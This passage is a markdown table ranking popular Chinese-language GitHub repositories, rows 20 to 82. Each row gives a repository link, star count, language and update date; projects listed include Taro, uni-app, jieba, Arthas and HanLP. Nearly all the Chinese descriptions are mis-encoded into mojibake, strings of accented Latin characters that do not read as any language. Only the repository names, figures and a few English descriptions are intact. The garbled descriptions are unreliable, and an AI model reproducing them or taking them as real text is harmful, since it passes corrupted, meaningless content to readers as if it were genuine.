|20|[NervJS/taro](https://github.com/NervJS/taro)|ÂºÄÊîæÂºèË∑®Á´ØË∑®Ê°ÜÊû∂Ëß£ÂÜ≥ÊñπÊ°àÔºåÊîØÊåÅ‰ΩøÁî® React/Vue/Nerv Á≠âÊ°ÜÊû∂Êù•ÂºÄÂèëÂæÆ‰ø°/‰∫¨‰∏ú/ÁôæÂ∫¶/ÊîØ‰ªòÂÆù/Â≠óËäÇË∑≥Âä®/ QQ Â∞èÁ®ãÂ∫è/H5 Á≠âÂ∫îÁî®„ÄÇ  https://taro.jd.com/|27.3k|JavaScript|10/30|
|21|[dcloudio/uni-app](https://github.com/dcloudio/uni-app)|uni-app ÊòØ‰ΩøÁî® Vue ËØ≠Ê≥ïÂºÄÂèëÂ∞èÁ®ãÂ∫è„ÄÅH5„ÄÅAppÁöÑÁªü‰∏ÄÊ°ÜÊû∂|26.5k|JavaScript|10/29|
|22|[Alvin9999/new-pac](https://github.com/Alvin9999/new-pac)|ÁßëÂ≠¶‰∏äÁΩë/Ëá™Áî±‰∏äÁΩë/ÁøªÂ¢ô/ËΩØ‰ª∂/ÊñπÊ≥ïÔºå‰∏ÄÈîÆÁøªÂ¢ôÊµèËßàÂô®ÔºåÂÖçË¥πshadowsocks/ss/ssr/v2ray/goflywayË¥¶Âè∑/ËäÇÁÇπÂàÜ‰∫´Ôºåvps‰∏ÄÈîÆÊê≠Âª∫ËÑöÊú¨/ÊïôÁ®ã|26.2k|-|09/27|
|23|[shengxinjing/programmer-job-blacklist](https://github.com/shengxinjing/programmer-job-blacklist)|:see_no_evil:Á®ãÂ∫èÂëòÊâæÂ∑•‰ΩúÈªëÂêçÂçïÔºåÊç¢Â∑•‰ΩúÂíåÂΩìÊäÄÊúØÂêà‰ºô‰∫∫ÈúÄË∞®ÊÖéÂïä Êõ¥Êñ∞ÊúâËµû|25.8k|Shell|07/03|
|24|[kon9chunkit/GitHub-Chinese-Top-Charts](https://github.com/kon9chunkit/GitHub-Chinese-Top-Charts)|:cn: GitHub‰∏≠ÊñáÊéíË°åÊ¶úÔºåÂ∏ÆÂä©‰Ω†ÂèëÁé∞È´òÂàÜ‰ºòÁßÄ‰∏≠ÊñáÈ°πÁõÆ„ÄÅÊõ¥È´òÊïàÂú∞Âê∏Êî∂ÂõΩ‰∫∫ÁöÑ‰ºòÁßÄÁªèÈ™åÊàêÊûúÔºõÊ¶úÂçïÊØèÂë®Êõ¥Êñ∞‰∏ÄÊ¨°ÔºåÊï¨ËØ∑ÂÖ≥Ê≥®ÔºÅ|25.7k|Java|10/24|
|25|[fighting41love/funNLP](https://github.com/fighting41love/funNLP)|‰∏≠Ëã±ÊñáÊïèÊÑüËØç„ÄÅËØ≠Ë®ÄÊ£ÄÊµã„ÄÅ‰∏≠Â§ñÊâãÊú∫/ÁîµËØùÂΩíÂ±ûÂú∞/ËøêËê•ÂïÜÊü•ËØ¢„ÄÅÂêçÂ≠óÊé®Êñ≠ÊÄßÂà´„ÄÅÊâãÊú∫Âè∑ÊäΩÂèñ„ÄÅË∫´‰ªΩËØÅÊäΩÂèñ„ÄÅÈÇÆÁÆ±ÊäΩÂèñ„ÄÅ‰∏≠Êó•Êñá‰∫∫ÂêçÂ∫ì„ÄÅ‰∏≠ÊñáÁº©ÂÜôÂ∫ì„ÄÅÊãÜÂ≠óËØçÂÖ∏„ÄÅËØçÊ±áÊÉÖÊÑüÂÄº„ÄÅÂÅúÁî®ËØç„ÄÅÂèçÂä®ËØçË°®„ÄÅÊö¥ÊÅêËØçË°®„ÄÅÁπÅÁÆÄ‰ΩìËΩ¨Êç¢„ÄÅËã±ÊñáÊ®°Êãü‰∏≠ÊñáÂèëÈü≥„ÄÅÊ±™Â≥∞Ê≠åËØçÁîüÊàêÂô®„ÄÅËÅå‰∏öÂêçÁß∞ËØçÂ∫ì„ÄÅÂêå‰πâËØçÂ∫ì„ÄÅÂèç‰πâËØçÂ∫ì„ÄÅÂê¶ÂÆöËØçÂ∫ì„ÄÅÊ±ΩËΩ¶ÂìÅÁâåËØçÂ∫ì„ÄÅÊ±ΩËΩ¶Èõ∂‰ª∂ËØçÂ∫ì„ÄÅËøûÁª≠Ëã±ÊñáÂàáÂâ≤„ÄÅÂêÑÁßç‰∏≠ÊñáËØçÂêëÈáè„ÄÅÂÖ¨Âè∏ÂêçÂ≠óÂ§ßÂÖ®„ÄÅÂè§ËØóËØçÂ∫ì„ÄÅITËØçÂ∫ì„ÄÅË¥¢ÁªèËØçÂ∫ì„ÄÅÊàêËØ≠ËØçÂ∫ì„ÄÅÂú∞ÂêçËØçÂ∫ì„ÄÅÂéÜÂè≤Âêç‰∫∫ËØçÂ∫ì„ÄÅËØóËØçËØçÂ∫ì„ÄÅÂåªÂ≠¶ËØçÂ∫ì„ÄÅÈ•ÆÈ£üËØçÂ∫ì„ÄÅÊ≥ïÂæãËØçÂ∫ì„ÄÅÊ±ΩËΩ¶ËØçÂ∫ì„ÄÅÂä®Áâ©ËØçÂ∫ì„ÄÅ‰∏≠ÊñáËÅäÂ§©ËØ≠Êñô„ÄÅ‰∏≠ÊñáË∞£Ë®ÄÊï∞ÊçÆ„ÄÅÁôæÂ∫¶‰∏≠ÊñáÈóÆÁ≠îÊï∞ÊçÆÈõÜ„ÄÅÂè•Â≠êÁõ∏‰ººÂ∫¶ÂåπÈÖçÁÆóÊ≥ïÈõÜÂêà„ÄÅbertËµÑÊ∫ê„ÄÅÊñáÊú¨ÁîüÊàê&ÊëòË¶ÅÁõ∏ÂÖ≥Â∑•ÂÖ∑„ÄÅcocoNLP‰ø°ÊÅØÊäΩÂèñ ...|25.6k|Python|10/02|
|26|[proxyee-down-org/proxyee-down](https://github.com/proxyee-down-org/proxyee-down)|http‰∏ãËΩΩÂ∑•ÂÖ∑ÔºåÂü∫‰∫éhttp‰ª£ÁêÜÔºåÊîØÊåÅÂ§öËøûÊé•ÂàÜÂùó‰∏ãËΩΩ|25.5k|Java|08/11|
|27|[houshanren/hangzhou_house_knowledge](https://github.com/houshanren/hangzhou_house_knowledge)|2017Âπ¥‰π∞ÊàøÁªèÂéÜÊÄªÁªìÂá∫Êù•ÁöÑ‰π∞ÊàøË¥≠ÊàøÁü•ËØÜÂàÜ‰∫´ÁªôÂ§ßÂÆ∂ÔºåÂ∏åÊúõÂØπÂ§ßÂÆ∂ÊúâÊâÄÂ∏ÆÂä©„ÄÇ‰π∞Êàø‰∏çÊòìÔºå‰∏î‰π∞‰∏îÁèçÊÉú„ÄÇSharing the knowledge of buy an own house that according  to the experience at hangzhou in 2017 to all the people. It's not easy to buy a own house, so I hope that it would be useful to everyone.|24.5k|CSS|10/18|
|28|[fxsjy/jieba](https://github.com/fxsjy/jieba)|ÁªìÂ∑¥‰∏≠ÊñáÂàÜËØç|24.5k|Python|07/24|
|29|[ityouknow/spring-boot-examples](https://github.com/ityouknow/spring-boot-examples)|about learning Spring Boot via examples. Spring Boot ÊïôÁ®ã„ÄÅÊäÄÊúØÊ†àÁ§∫‰æã‰ª£Á†ÅÔºåÂø´ÈÄüÁÆÄÂçï‰∏äÊâãÊïôÁ®ã„ÄÇ |23.9k|Java|10/19|
|30|[alibaba/arthas](https://github.com/alibaba/arthas)|Alibaba Java Diagnostic Tool Arthas/Alibaba JavaËØäÊñ≠Âà©Âô®Arthas|23.5k|Java|10/29|
|31|[unknwon/the-way-to-go_ZH_CN](https://github.com/unknwon/the-way-to-go_ZH_CN)|„ÄäThe Way to Go„Äã‰∏≠ÊñáËØëÊú¨Ôºå‰∏≠ÊñáÊ≠£ÂºèÂêç„ÄäGo ÂÖ•Èó®ÊåáÂçó„Äã|23.4k|Go|10/22|
|32|[lib-pku/libpku](https://github.com/lib-pku/libpku)|Ë¥µÊ†°ËØæÁ®ãËµÑÊñôÊ∞ëÈó¥Êï¥ÁêÜ|22.9k|TeX|06/28|
|33|[ctripcorp/apollo](https://github.com/ctripcorp/apollo)|ApolloÔºàÈòøÊ≥¢ÁΩóÔºâÊòØÊê∫Á®ãÊ°ÜÊû∂ÈÉ®Èó®Á†îÂèëÁöÑÂàÜÂ∏ÉÂºèÈÖçÁΩÆ‰∏≠ÂøÉÔºåËÉΩÂ§üÈõÜ‰∏≠ÂåñÁÆ°ÁêÜÂ∫îÁî®‰∏çÂêåÁéØÂ¢É„ÄÅ‰∏çÂêåÈõÜÁæ§ÁöÑÈÖçÁΩÆÔºåÈÖçÁΩÆ‰øÆÊîπÂêéËÉΩÂ§üÂÆûÊó∂Êé®ÈÄÅÂà∞Â∫îÁî®Á´ØÔºåÂπ∂‰∏îÂÖ∑Â§áËßÑËåÉÁöÑÊùÉÈôê„ÄÅÊµÅÁ®ãÊ≤ªÁêÜÁ≠âÁâπÊÄßÔºåÈÄÇÁî®‰∫éÂæÆÊúçÂä°ÈÖçÁΩÆÁÆ°ÁêÜÂú∫ÊôØ„ÄÇ|22.7k|Java|10/24|
|34|[sentsin/layui](https://github.com/sentsin/layui)|ÈááÁî®Ëá™Ë∫´Ê®°ÂùóËßÑËåÉÁºñÂÜôÁöÑÂâçÁ´Ø UI Ê°ÜÊû∂ÔºåÈÅµÂæ™ÂéüÁîü HTML/CSS/JS ÁöÑ‰π¶ÂÜôÂΩ¢ÂºèÔºåÊûÅ‰ΩéÈó®ÊßõÔºåÊãøÊù•Âç≥Áî®„ÄÇ|22.6k|JavaScript|10/02|
|35|[formulahendry/955.WLB](https://github.com/formulahendry/955.WLB)|955 ‰∏çÂä†Áè≠ÁöÑÂÖ¨Âè∏ÂêçÂçï - Â∑•‰Ωú 955Ôºåwork‚Äìlife balance (Â∑•‰Ωú‰∏éÁîüÊ¥ªÁöÑÂπ≥Ë°°)|22.6k|-|10/11|
|36|[alibaba/druid](https://github.com/alibaba/druid)|ÈòøÈáåÂ∑¥Â∑¥ËÆ°ÁÆóÂπ≥Âè∞‰∫ã‰∏öÈÉ®Âá∫ÂìÅÔºå‰∏∫ÁõëÊéßËÄåÁîüÁöÑÊï∞ÊçÆÂ∫ìËøûÊé•Ê±†|22.5k|Java|10/25|
|37|[alibaba/flutter-go](https://github.com/alibaba/flutter-go)|flutter ÂºÄÂèëËÄÖÂ∏ÆÂä© APPÔºåÂåÖÂê´ flutter Â∏∏Áî® 140+ ÁªÑ‰ª∂ÁöÑdemo ÊºîÁ§∫‰∏é‰∏≠ÊñáÊñáÊ°£|22.1k|Dart|10/13|
|38|[scwang90/SmartRefreshLayout](https://github.com/scwang90/SmartRefreshLayout)|üî•‰∏ãÊãâÂà∑Êñ∞„ÄÅ‰∏äÊãâÂä†ËΩΩ„ÄÅ‰∫åÁ∫ßÂà∑Êñ∞„ÄÅÊ∑òÂÆù‰∫åÊ•º„ÄÅRefreshLayout„ÄÅOverScrollÔºåAndroidÊô∫ËÉΩ‰∏ãÊãâÂà∑Êñ∞Ê°ÜÊû∂ÔºåÊîØÊåÅË∂äÁïåÂõûÂºπ„ÄÅË∂äÁïåÊãñÂä®ÔºåÂÖ∑ÊúâÊûÅÂº∫ÁöÑÊâ©Â±ïÊÄßÔºåÈõÜÊàê‰∫ÜÂá†ÂçÅÁßçÁÇ´ÈÖ∑ÁöÑHeaderÂíå Footer„ÄÇ|21.7k|Java|10/18|
|39|[hankcs/HanLP](https://github.com/hankcs/HanLP)|‰∏≠ÊñáÂàÜËØç ËØçÊÄßÊ†áÊ≥® ÂëΩÂêçÂÆû‰ΩìËØÜÂà´ ‰æùÂ≠òÂè•Ê≥ïÂàÜÊûê ËØ≠‰πâ‰æùÂ≠òÂàÜÊûê Êñ∞ËØçÂèëÁé∞ ÂÖ≥ÈîÆËØçÁü≠ËØ≠ÊèêÂèñ Ëá™Âä®ÊëòË¶Å ÊñáÊú¨ÂàÜÁ±ªËÅöÁ±ª ÊãºÈü≥ÁÆÄÁπÅËΩ¨Êç¢ Ëá™ÁÑ∂ËØ≠Ë®ÄÂ§ÑÁêÜ|21.1k|Python|10/29|
|40|[littlecodersh/ItChat](https://github.com/littlecodersh/ItChat)|A complete and graceful API for Wechat. ÂæÆ‰ø°‰∏™‰∫∫Âè∑Êé•Âè£„ÄÅÂæÆ‰ø°Êú∫Âô®‰∫∫ÂèäÂëΩ‰ª§Ë°åÂæÆ‰ø°Ôºå‰∏âÂçÅË°åÂç≥ÂèØËá™ÂÆö‰πâ‰∏™‰∫∫Âè∑Êú∫Âô®‰∫∫„ÄÇ|20.9k|Python|10/28|
|41|[Advanced-Frontend/Daily-Interview-Question](https://github.com/Advanced-Frontend/Daily-Interview-Question)|ÊàëÊòØÊú®ÊòìÊù®ÔºåÂÖ¨‰ºóÂè∑„ÄåÈ´òÁ∫ßÂâçÁ´ØËøõÈò∂„Äç‰ΩúËÄÖÔºåÊØèÂ§©ÊêûÂÆö‰∏ÄÈÅìÂâçÁ´ØÂ§ßÂéÇÈù¢ËØïÈ¢òÔºåÁ•ùÂ§ßÂÆ∂Â§©Â§©ËøõÊ≠•Ôºå‰∏ÄÂπ¥Âêé‰ºöÁúãÂà∞‰∏ç‰∏ÄÊ†∑ÁöÑËá™Â∑±„ÄÇ|20.8k|JavaScript|05/27|
|42|[Tencent/wepy](https://github.com/Tencent/wepy)|Â∞èÁ®ãÂ∫èÁªÑ‰ª∂ÂåñÂºÄÂèëÊ°ÜÊû∂|20.8k|JavaScript|10/04|
|43|[mqyqingfeng/Blog](https://github.com/mqyqingfeng/Blog)|ÂÜ¥ÁæΩÂÜôÂçöÂÆ¢ÁöÑÂú∞ÊñπÔºåÈ¢ÑËÆ°ÂÜôÂõõ‰∏™Á≥ªÂàóÔºöJavaScriptÊ∑±ÂÖ•Á≥ªÂàó„ÄÅJavaScript‰∏ìÈ¢òÁ≥ªÂàó„ÄÅES6Á≥ªÂàó„ÄÅReactÁ≥ªÂàó„ÄÇ|20.3k|-|07/21|
|44|[jobbole/awesome-python-cn](https://github.com/jobbole/awesome-python-cn)|PythonËµÑÊ∫êÂ§ßÂÖ®‰∏≠ÊñáÁâàÔºåÂåÖÊã¨ÔºöWebÊ°ÜÊû∂„ÄÅÁΩëÁªúÁà¨Ëô´„ÄÅÊ®°ÊùøÂºïÊìé„ÄÅÊï∞ÊçÆÂ∫ì„ÄÅÊï∞ÊçÆÂèØËßÜÂåñ„ÄÅÂõæÁâáÂ§ÑÁêÜÁ≠âÔºåÁî±‰ºØ‰πêÂú®Á∫øÊåÅÁª≠Êõ¥Êñ∞„ÄÇ|20.2k|Makefile|10/13|
|45|[Meituan-Dianping/mpvue](https://github.com/Meituan-Dianping/mpvue)|Âü∫‰∫é Vue.js ÁöÑÂ∞èÁ®ãÂ∫èÂºÄÂèëÊ°ÜÊû∂Ôºå‰ªéÂ∫ïÂ±ÇÊîØÊåÅ Vue.js ËØ≠Ê≥ïÂíåÊûÑÂª∫Â∑•ÂÖ∑‰ΩìÁ≥ª„ÄÇ|20.1k|JavaScript|09/09|
|46|[googlehosts/hosts](https://github.com/googlehosts/hosts)|ÈïúÂÉèÔºöhttps://scaffrey.coding.net/p/hosts/git / https://git.qvq.network/googlehosts/hosts|19.9k|-|08/26|
|47|[AobingJava/JavaFamily](https://github.com/AobingJava/JavaFamily)|„ÄêJavaÈù¢ËØï+JavaÂ≠¶‰π†ÊåáÂçó„Äë ‰∏Ä‰ªΩÊ∂µÁõñÂ§ßÈÉ®ÂàÜJavaÁ®ãÂ∫èÂëòÊâÄÈúÄË¶ÅÊéåÊè°ÁöÑÊ†∏ÂøÉÁü•ËØÜ„ÄÇ|19.8k|-|10/15|
|48|[SwiftGGTeam/the-swift-programming-language-in-chinese](https://github.com/SwiftGGTeam/the-swift-programming-language-in-chinese)|‰∏≠ÊñáÁâà Apple ÂÆòÊñπ Swift ÊïôÁ®ã„ÄäThe Swift Programming Language„Äã|19.8k|CSS|10/25|
|49|[byoungd/English-level-up-tips-for-Chinese](https://github.com/byoungd/English-level-up-tips-for-Chinese)|ÂèØËÉΩÊòØËÆ©‰Ω†ÂèóÁõäÂå™ÊµÖÁöÑËã±ËØ≠ËøõÈò∂ÊåáÂçó|19.7k|-|08/10|
|50|[geekxh/hello-algorithm](https://github.com/geekxh/hello-algorithm)|üåç ‰∏úÂçäÁêÉÊúÄÈÖ∑ÁöÑÂ≠¶‰π†È°πÁõÆ   1„ÄÅÊàëÂÜôÁöÑ‰∏âÂçÅ‰∏áÂ≠óÁÆóÊ≥ïÂõæËß£ 2„ÄÅÂçÉÊú¨ÂºÄÊ∫êÁîµÂ≠ê‰π¶ 3„ÄÅ100 Âº†ÊÄùÁª¥ÂØºÂõæ 4„ÄÅ100 ÁØáÂ§ßÂéÇÈù¢Áªè 5„ÄÅ30 ‰∏™Â≠¶‰π†‰∏ìÈ¢ò  üöÄ üöÄ üöÄ Âè≥‰∏äËßíÁÇπ‰∏™ starÔºåÂä†ÂÖ•Êàë‰ª¨‰∏á‰∫∫Â≠¶‰π†Áæ§ÔºÅEnglish SupportedÔºÅ|19.7k|Java|10/25|
|51|[FallibleInc/security-guide-for-developers](https://github.com/FallibleInc/security-guide-for-developers)|Security Guide for Developers (ÂÆûÁî®ÊÄßÂºÄÂèë‰∫∫ÂëòÂÆâÂÖ®È°ªÁü•)|19.3k|-|10/02|
|52|[kataras/iris](https://github.com/kataras/iris)|The fastest HTTP/2 Go Web Framework. AWS Lambda, gRPC, MVC, Unique Router, Websockets, Sessions, Test suite, Dependency Injection and more. A true successor of expressjs and laravel   Ë∞¢Ë∞¢ https://github.com/kataras/iris/issues/1329  |19.3k|Go|10/19|
|53|[fengdu78/Coursera-ML-AndrewNg-Notes](https://github.com/fengdu78/Coursera-ML-AndrewNg-Notes)|Âê¥ÊÅ©ËææËÄÅÂ∏àÁöÑÊú∫Âô®Â≠¶‰π†ËØæÁ®ã‰∏™‰∫∫Á¨îËÆ∞|19.3k|HTML|10/28|
|54|[QSCTech/zju-icicles](https://github.com/QSCTech/zju-icicles)|ÊµôÊ±üÂ§ßÂ≠¶ËØæÁ®ãÊîªÁï•ÂÖ±‰∫´ËÆ°Âàí|19.2k|HTML|10/24|
|55|[lenve/vhr](https://github.com/lenve/vhr)|ÂæÆ‰∫∫‰∫ãÊòØ‰∏Ä‰∏™ÂâçÂêéÁ´ØÂàÜÁ¶ªÁöÑ‰∫∫ÂäõËµÑÊ∫êÁÆ°ÁêÜÁ≥ªÁªüÔºåÈ°πÁõÆÈááÁî®SpringBoot+VueÂºÄÂèë„ÄÇ|19.0k|Java|10/15|
|56|[d2l-ai/d2l-zh](https://github.com/d2l-ai/d2l-zh)|„ÄäÂä®ÊâãÂ≠¶Ê∑±Â∫¶Â≠¶‰π†„ÄãÔºöÈù¢Âêë‰∏≠ÊñáËØªËÄÖ„ÄÅËÉΩËøêË°å„ÄÅÂèØËÆ®ËÆ∫„ÄÇËã±ÊñáÁâàÂç≥‰ºØÂÖãÂà©‚ÄúÊ∑±Â∫¶Â≠¶‰π†ÂØºËÆ∫‚ÄùÊïôÊùê„ÄÇ|19.0k|Python|10/29|
|57|[bannedbook/fanqiang](https://github.com/bannedbook/fanqiang)|ÁøªÂ¢ô-ÁßëÂ≠¶‰∏äÁΩë|18.9k|Rich Text Format|10/25|
|58|[ruanyf/es6tutorial](https://github.com/ruanyf/es6tutorial)|„ÄäECMAScript 6ÂÖ•Èó®„ÄãÊòØ‰∏ÄÊú¨ÂºÄÊ∫êÁöÑ JavaScript ËØ≠Ë®ÄÊïôÁ®ãÔºåÂÖ®Èù¢‰ªãÁªç ECMAScript 6 Êñ∞Â¢ûÁöÑËØ≠Ê≥ïÁâπÊÄß„ÄÇ|18.7k|JavaScript|10/27|
|59|[xkcoding/spring-boot-demo](https://github.com/xkcoding/spring-boot-demo)|spring boot demo ÊòØ‰∏Ä‰∏™Áî®Êù•Ê∑±Â∫¶Â≠¶‰π†Âπ∂ÂÆûÊàò spring boot ÁöÑÈ°πÁõÆÔºåÁõÆÂâçÊÄªÂÖ±ÂåÖÂê´ 65 ‰∏™ÈõÜÊàêdemoÔºåÂ∑≤ÁªèÂÆåÊàê 53 ‰∏™„ÄÇ  ËØ•È°πÁõÆÂ∑≤ÊàêÂäüÈõÜÊàê actuator(ÁõëÊéß)„ÄÅadmin(ÂèØËßÜÂåñÁõëÊéß)„ÄÅlogback(Êó•Âøó)„ÄÅaopLog(ÈÄöËøáAOPËÆ∞ÂΩïwebËØ∑Ê±ÇÊó•Âøó)„ÄÅÁªü‰∏ÄÂºÇÂ∏∏Â§ÑÁêÜ(jsonÁ∫ßÂà´ÂíåÈ°µÈù¢Á∫ßÂà´)„ÄÅfreemarker(Ê®°ÊùøÂºïÊìé)„ÄÅthymeleaf(Ê®°ÊùøÂºïÊìé)„ÄÅBeetl(Ê®°ÊùøÂºïÊìé)„ÄÅEnjoy(Ê®°ÊùøÂºïÊìé)„ÄÅJdbcTemplate(ÈÄöÁî®JDBCÊìç‰ΩúÊï∞ÊçÆÂ∫ì)„ÄÅJPA(Âº∫Â§ßÁöÑORMÊ°ÜÊû∂)„ÄÅmybatis(Âº∫Â§ßÁöÑORMÊ°ÜÊû∂)„ÄÅÈÄöÁî®Mapper(Âø´ÈÄüÊìç‰ΩúMybati ...|18.6k|Java|10/27|
|60|[YMFE/yapi](https://github.com/YMFE/yapi)|YApi ÊòØ‰∏Ä‰∏™ÂèØÊú¨Âú∞ÈÉ®ÁΩ≤ÁöÑ„ÄÅÊâìÈÄöÂâçÂêéÁ´ØÂèäQAÁöÑ„ÄÅÂèØËßÜÂåñÁöÑÊé•Âè£ÁÆ°ÁêÜÂπ≥Âè∞|18.3k|JavaScript|10/26|
|61|[komeiji-satori/Dress](https://github.com/komeiji-satori/Dress)|Â•ΩËÄ∂  ÊòØÂ•≥Ë£Ö|18.3k|Standard ML|10/29|
|62|[hollischuang/toBeTopJavaer](https://github.com/hollischuang/toBeTopJavaer)|To Be Top Javaer - JavaÂ∑•Á®ãÂ∏àÊàêÁ•û‰πãË∑Ø|17.9k|Java|10/25|
|63|[davideuler/architecture.of.internet-product](https://github.com/davideuler/architecture.of.internet-product)|‰∫íËÅîÁΩëÂÖ¨Âè∏ÊäÄÊúØÊû∂ÊûÑÔºåÂæÆ‰ø°/Ê∑òÂÆù/ÂæÆÂçö/ËÖæËÆØ/ÈòøÈáå/ÁæéÂõ¢ÁÇπËØÑ/ÁôæÂ∫¶/Google/Facebook/Amazon/eBayÁöÑÊû∂ÊûÑÔºåÊ¨¢ËøéPRË°•ÂÖÖ|17.9k|-|10/24|
|64|[Binaryify/NeteaseCloudMusicApi](https://github.com/Binaryify/NeteaseCloudMusicApi)|ÁΩëÊòì‰∫ëÈü≥‰πê Node.js API service|17.5k|JavaScript|10/29|
|65|[TeamStuQ/skill-map](https://github.com/TeamStuQ/skill-map)|Á®ãÂ∫èÂëòÊäÄËÉΩÂõæË∞±|17.4k|HTML|08/28|
|66|[alibaba/easyexcel](https://github.com/alibaba/easyexcel)|Âø´ÈÄü„ÄÅÁÆÄÂçïÈÅøÂÖçOOMÁöÑjavaÂ§ÑÁêÜExcelÂ∑•ÂÖ∑|17.4k|Java|10/27|
|67|[zhaoolee/ChromeAppHeroes](https://github.com/zhaoolee/ChromeAppHeroes)|üåàË∞∑Á≤í-ChromeÊèí‰ª∂Ëã±ÈõÑÊ¶ú, ‰∏∫‰ºòÁßÄÁöÑChromeÊèí‰ª∂ÂÜô‰∏ÄÊú¨‰∏≠ÊñáËØ¥Êòé‰π¶, ËÆ©ChromeÊèí‰ª∂Ëã±ÈõÑ‰ª¨ÈÄ†Á¶è‰∫∫Á±ª~  ChromePluginHeroes, Write a Chinese manual for the excellent Chrome plugin, let the Chrome plugin heroes benefit the human~ ÂÖ¨‰ºóÂè∑„Äå0Âä†1„ÄçÂêåÊ≠•Êõ¥Êñ∞|17.2k|JavaScript|10/26|
|68|[qiurunze123/miaosha](https://github.com/qiurunze123/miaosha)|‚≠ê‚≠ê‚≠ê‚≠êÁßíÊùÄÁ≥ªÁªüËÆæËÆ°‰∏éÂÆûÁé∞.‰∫íËÅîÁΩëÂ∑•Á®ãÂ∏àËøõÈò∂‰∏éÂàÜÊûêüôãüêì|17.2k|Java|10/19|
|69|[wuyouzhuguli/SpringAll](https://github.com/wuyouzhuguli/SpringAll)|Âæ™Â∫èÊ∏êËøõÔºåÂ≠¶‰π†Spring Boot„ÄÅSpring Boot & Shiro„ÄÅSpring Batch„ÄÅSpring Cloud„ÄÅSpring Cloud Alibaba„ÄÅSpring Security & Spring Security OAuth2ÔºåÂçöÂÆ¢SpringÁ≥ªÂàóÊ∫êÁ†ÅÔºöhttps://mrbird.cc|17.1k|Java|05/13|
|70|[halo-dev/halo](https://github.com/halo-dev/halo)|‚úç  An excellent open source blog publishing application.   ‰∏Ä‰∏™‰ºòÁßÄÁöÑÂºÄÊ∫êÂçöÂÆ¢ÂèëÂ∏ÉÂ∫îÁî®„ÄÇ|17.1k|Java|10/30|
|71|[wangzheng0822/algo](https://github.com/wangzheng0822/algo)|Êï∞ÊçÆÁªìÊûÑÂíåÁÆóÊ≥ïÂøÖÁü•ÂøÖ‰ºöÁöÑ50‰∏™‰ª£Á†ÅÂÆûÁé∞|16.9k|Python|10/29|
|72|[zhangdaiscott/jeecg-boot](https://github.com/zhangdaiscott/jeecg-boot)|Âü∫‰∫é‰ª£Á†ÅÁîüÊàêÂô®ÁöÑ‰Ωé‰ª£Á†ÅÂπ≥Âè∞ÔºåË∂ÖË∂ä‰º†ÁªüÂïÜ‰∏öÂπ≥Âè∞ÔºÅÂâçÂêéÁ´ØÂàÜÁ¶ªÊû∂ÊûÑÔºöSpringBoot 2.xÔºåSpringCloud AlibabaÔºåAnt Design&VueÔºåMybatis-plusÔºåShiroÔºåJWT„ÄÇÂº∫Â§ßÁöÑ‰ª£Á†ÅÁîüÊàêÂô®ËÆ©ÂâçÂêéÁ´Ø‰ª£Á†Å‰∏ÄÈîÆÁîüÊàêÔºåÊó†ÈúÄÂÜô‰ªª‰Ωï‰ª£Á†Å! ÂºïÈ¢ÜÊñ∞ÂºÄÂèëÊ®°Âºè(OnlineCoding-> ‰ª£Á†ÅÁîüÊàê-> ÊâãÂ∑•MERGE)ÔºåÂ∏ÆÂä©JavaÈ°πÁõÆËß£ÂÜ≥70%ÈáçÂ§çÂ∑•‰ΩúÔºåËÆ©ÂºÄÂèëÊõ¥ÂÖ≥Ê≥®‰∏öÂä°ÈÄªËæëÔºåÊó¢ËÉΩÂø´ÈÄüÊèêÈ´òÂºÄÂèëÊïàÁéáÔºåÂ∏ÆÂä©ÂÖ¨Âè∏ËäÇÁúÅÊàêÊú¨ÔºåÂêåÊó∂Âèà‰∏çÂ§±ÁÅµÊ¥ªÊÄß„ÄÇ|16.8k|Java|10/29|
|73|[judasn/IntelliJ-IDEA-Tutorial](https://github.com/judasn/IntelliJ-IDEA-Tutorial)|IntelliJ IDEA ÁÆÄ‰Ωì‰∏≠Êñá‰∏ìÈ¢òÊïôÁ®ã|16.8k|-|10/12|
|74|[wenyan-lang/wenyan](https://github.com/wenyan-lang/wenyan)|ÊñáË®ÄÊñáÁ∑®Á®ãË™ûË®Ä A programming language for the ancient Chinese.|16.7k|TypeScript|08/09|
|75|[alibaba/canal](https://github.com/alibaba/canal)|ÈòøÈáåÂ∑¥Â∑¥ MySQL binlog Â¢ûÈáèËÆ¢ÈòÖ&Ê∂àË¥πÁªÑ‰ª∂ |16.3k|Java|10/29|
|76|[reactnativecn/react-native-guide](https://github.com/reactnativecn/react-native-guide)|React NativeÊåáÂçóÊ±áÈõÜ‰∫ÜÂêÑÁ±ªreact-nativeÂ≠¶‰π†ËµÑÊ∫ê„ÄÅÂºÄÊ∫êAppÂíåÁªÑ‰ª∂|16.2k|-|07/27|
|77|[xuxueli/xxl-job](https://github.com/xuxueli/xxl-job)|A distributed task scheduling framework.ÔºàÂàÜÂ∏ÉÂºè‰ªªÂä°Ë∞ÉÂ∫¶Âπ≥Âè∞XXL-JOBÔºâ|16.1k|Java|10/29|
|78|[1c7/chinese-independent-developer](https://github.com/1c7/chinese-independent-developer)|üë©üèø‚Äçüíªüë®üèæ‚Äçüíªüë©üèº‚Äçüíªüë®üèΩ‚Äçüíªüë©üèª‚Äçüíª‰∏≠ÂõΩÁã¨Á´ãÂºÄÂèëËÄÖÈ°πÁõÆÂàóË°® -- ÂàÜ‰∫´Â§ßÂÆ∂ÈÉΩÂú®ÂÅö‰ªÄ‰πà|16.0k|-|10/28|
|79|[alsotang/node-lessons](https://github.com/alsotang/node-lessons)|:closed_book:„ÄäNode.js ÂåÖÊïô‰∏çÂåÖ‰ºö„Äã by alsotang|16.0k|JavaScript|06/10|
|80|[MLEveryday/100-Days-Of-ML-Code](https://github.com/MLEveryday/100-Days-Of-ML-Code)|100-Days-Of-ML-Code‰∏≠ÊñáÁâà|15.9k|Jupyter Notebook|02/18|
|81|[didi/DoraemonKit](https://github.com/didi/DoraemonKit)|A full-featured App (iOS & Android) development assistant. You deserve it.  ÁÆÄÁß∞ ""DoKit"" „ÄÇ‰∏ÄÊ¨æÂäüËÉΩÈΩêÂÖ®ÁöÑÂÆ¢Êà∑Á´ØÔºà iOS „ÄÅAndroid„ÄÅÂæÆ‰ø°Â∞èÁ®ãÂ∫è ÔºâÁ†îÂèëÂä©ÊâãÔºå‰Ω†ÂÄºÂæóÊã•Êúâ„ÄÇhttps://www.dokit.cn/|15.8k|Java|10/29|
|82|[Awesome-HarmonyOS/HarmonyOS](https://github.com/Awesome-HarmonyOS/HarmonyOS)|A curated list of awesome things related to HarmonyOS. Âçé‰∏∫È∏øËíôÊìç‰ΩúÁ≥ªÁªü„ÄÇ|15.8k|C|09/15|
